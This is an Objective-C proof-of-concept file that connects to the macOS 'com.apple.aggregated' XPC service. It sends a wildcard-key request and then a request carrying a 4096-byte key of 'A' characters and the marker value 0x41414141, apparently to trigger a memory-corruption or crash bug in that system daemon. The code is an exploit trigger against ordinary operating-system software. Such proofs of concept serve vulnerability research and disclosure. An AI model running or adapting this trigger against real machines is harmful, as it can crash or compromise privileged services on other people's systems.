#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <xpc/xpc.h>

#include <Foundation/Foundation.h>

void go(void) {

    xpc_connection_t connection = xpc_connection_create_mach_service(
        "com.apple.aggregated", NULL, 0);

    xpc_connection_set_event_handler(connection, ^(xpc_object_t event){
            NSLog(@"%@", event);
    });
    xpc_connection_resume(connection);

    const char *pattern = ".*";
    char buffer[0x1000] = { 0 };
    memset(buffer, 'A', sizeof(buffer));

    xpc_object_t message = xpc_dictionary_create(NULL, NULL, 0);
    xpc_dictionary_set_int64(message, "operation", 0xD);
    xpc_dictionary_set_string(message, "key", pattern);
    xpc_object_t response = xpc_connection_send_message_with_reply_sync(connection, message);
    NSLog(@"%@", response);

    xpc_dictionary_set_int64(message, "operation", 0x5);
    xpc_dictionary_set_string(message, "key", buffer);
    xpc_dictionary_set_int64(message, "value", 0x41414141);
    response = xpc_connection_send_message_with_reply_sync(connection, message);
    NSLog(@"%@", response);

    return;
}
